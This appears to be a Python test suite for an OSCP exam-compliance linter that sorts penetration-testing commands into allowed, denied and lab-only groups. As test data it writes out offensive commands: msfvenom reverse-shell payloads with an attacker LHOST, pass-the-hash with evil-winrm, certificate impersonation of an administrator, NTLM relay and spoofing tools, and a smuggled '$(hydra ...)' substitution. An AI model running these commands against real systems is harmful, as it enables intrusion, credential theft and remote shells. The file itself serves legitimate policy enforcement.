"""analyzers/compliance.py is the single source of truth for exam legality.
These tests make allow/deny/lab-only list drift, alias/case gaps and tag
semantics impossible to regress (iter-310 found msfvenom in BOTH lists)."""
import unittest

from tests._helpers import compliance as C


class ListConsistencyTests(unittest.TestCase):
    # 1
    def test_allow_deny_lab_disjoint(self):
        self.assertEqual(C.ALLOWLIST_BINARIES & C.DENYLIST_BINARIES, frozenset())
        self.assertEqual(C.ALLOWLIST_BINARIES & C.LAB_ONLY_BINARIES, frozenset())
        # lint lowercases before lookup -> deny / lab-only entries must be lowercase
        self.assertTrue(all(b == b.lower() for b in C.DENYLIST_BINARIES | C.LAB_ONLY_BINARIES))

    # 2
    def test_lab_only_minus_deny_is_exactly_the_tag_path(self):
        self.assertEqual(C.LAB_ONLY_BINARIES - C.DENYLIST_BINARIES,
                         frozenset({"arpspoof", "bettercap", "dnsspoof", "tcpdump-poison"}))
        # poisoning / relay is denied outright on the exam; the tag path only
        # exists for ARP/DNS lab demos.
        self.assertTrue({"responder", "responder.py", "ntlmrelayx.py", "impacket-ntlmrelayx",
                         "mitm6", "inveigh", "inveigh.ps1", "ettercap"} <= C.DENYLIST_BINARIES)

    # 3
    def test_every_allowlist_entry_passes_lint(self):
        for b in sorted(C.ALLOWLIST_BINARIES):
            with self.subTest(binary=b):
                self.assertEqual(C.lint_command(b + " --help"), (True, ""))

    # 4
    def test_every_denylist_entry_fails_lint_even_tagged(self):
        for b in sorted(C.DENYLIST_BINARIES):
            with self.subTest(binary=b):
                ok, why = C.lint_command(b + " --help")
                self.assertFalse(ok)
                self.assertIn("PROHIBITED", why)
                ok2, _ = C.lint_command(b + " --help", tagged=True)
                self.assertFalse(ok2)

    # 11
    def test_msfvenom_and_handler_policy(self):
        self.assertIn("msfvenom", C.ALLOWLIST_BINARIES)
        self.assertNotIn("msfvenom", C.DENYLIST_BINARIES)
        self.assertIn("msfconsole", C.DENYLIST_BINARIES)
        # binary is legal; the quota is payload-level and is surfaced by the
        # keyword detector (see test_msfvenom_quota), not by the linter.
        self.assertTrue(C.lint_command("msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe")[0])


class LintSemanticsTests(unittest.TestCase):
    # 5
    def test_lab_only_needs_tag(self):
        for cmd in ("arpspoof -i eth0 -t 10.0.0.1 10.0.0.2", "bettercap -iface eth0"):
            with self.subTest(cmd=cmd):
                ok, why = C.lint_command(cmd)
                self.assertEqual((ok, C.LAB_ONLY_TAG in why), (False, True), why)
                self.assertEqual(C.lint_command(cmd, tagged=True), (True, ""))
                self.assertTrue(C.needs_lab_tag(cmd))
                self.assertFalse(C.is_denied(cmd))

    # 6
    def test_spoofing_relay_denied_even_when_tagged(self):
        for cmd in ("responder -I eth0",
                    "impacket-ntlmrelayx -tf targets.txt -smb2support",
                    "mitm6 -d corp.local",
                    "inveigh -ConsoleOutput Y"):
            for tagged in (False, True):
                with self.subTest(cmd=cmd, tagged=tagged):
                    ok, why = C.lint_command(cmd, tagged=tagged)
                    self.assertFalse(ok)
                    self.assertIn("PROHIBITED", why)

    # 7
    def test_exam_legal_commands_pass(self):
        legal = [
            "hashcat -m 1000 h.txt rockyou.txt",
            "netexec smb 10.10.11.5 -u jdoe -p 'x' ; impacket-psexec 'corp/jdoe:x'@10.10.11.5",
            "nmap -sV 10.10.11.5 | tee out.txt",
            "KRB5CCNAME=a.ccache impacket-psexec -k -no-pass a@b",
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev.exe",
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o m.exe",
            "bloodyAD --host 10.10.11.5 -d corp.local -u jdoe -p 'x' set password svc 'y'",
            "SharpHound.exe -c All",
            "certipy-ad req -u 'jdoe@corp.local' -p 'x' -ca 'corp-CA' -template 'UserAuth' "
            "-upn 'administrator@corp.local' -dc-ip 10.10.11.5",
            "evil-winrm -i 10.10.11.7 -u 'jdoe' -H 'c4b0e1b10c7ce2c4a2e9d1b6f5a3d8e7'",
            "chisel client 10.10.14.5:8080 R:socks",
            "sudo netexec smb x -u a -p b",
            "",
            "   ",
        ]
        for cmd in legal:
            with self.subTest(cmd=cmd):
                self.assertEqual(C.lint_command(cmd), (True, ""))

    # 8
    def test_banned_commands_fail(self):
        banned = ["sqlmap -u http://x", "hydra -l a -P p ssh://x",
                  "msfconsole -q -x 'use multi/handler'",
                  "nxc smb x -u a -p $(hydra -l a -P p x)", "nessus",
                  "medusa -h x -u a -P p -M ssh", "patator ssh_login host=x",
                  "ncrack -p 22 x", "nuclei -u http://x", "autorecon x", "ask chatgpt",
                  "echo `msfconsole`", "nmap -sV x && sqlmap -u y"]
        for cmd in banned:
            with self.subTest(cmd=cmd):
                ok, why = C.lint_command(cmd)
                self.assertFalse(ok, cmd)
                if any(t in cmd for t in ("msfconsole", "sqlmap", "hydra")):
                    self.assertIn("PROHIBITED", why)

    # 9
    def test_unknown_binary_rejected_with_name(self):
        self.assertEqual(C.lint_command("unknown-tool --x"),
                         (False, "primary binary 'unknown-tool' is not on the OSCP allowlist"))
        # placeholders / pure paths the engine fills in are tolerated
        self.assertTrue(C.lint_command("<tool> --x")[0])
        self.assertTrue(C.lint_command("./linpeas.sh")[0])

    # 10
    def test_is_meterpreter_and_quota_note(self):
        for s in ("windows/x64/meterpreter/reverse_tcp", "linux/x86/meterpreter_reverse_tcp",
                  "set payload windows/meterpreter/reverse_https", "meterpreter > getuid",
                  "WINDOWS/METERPRETER/REVERSE_TCP"):
            self.assertTrue(C.is_meterpreter(s), s)
        for s in ("windows/x64/shell_reverse_tcp", "cmd/unix/reverse_bash",
                  "windows/shell/bind_tcp", "", None):
            self.assertFalse(C.is_meterpreter(s), s)
        note = C.quota_note("x/meterpreter/y")
        self.assertIn("ONE", note)
        self.assertIn("Metasploit", note)
        self.assertEqual(C.quota_note("x/shell_reverse_tcp"), "")

    # 12
    def test_assert_legal_gate(self):
        with self.assertRaises(AssertionError) as cm:
            C.assert_legal([("nmap -sV x", False), ("sqlmap -u x", False)])
        self.assertIn("OSCP-compliance violation", str(cm.exception))
        self.assertIn("sqlmap", str(cm.exception))
        C.assert_legal([("nmap -sV x", False), ("arpspoof -i eth0 x", True)])   # must not raise


if __name__ == "__main__":
    unittest.main()
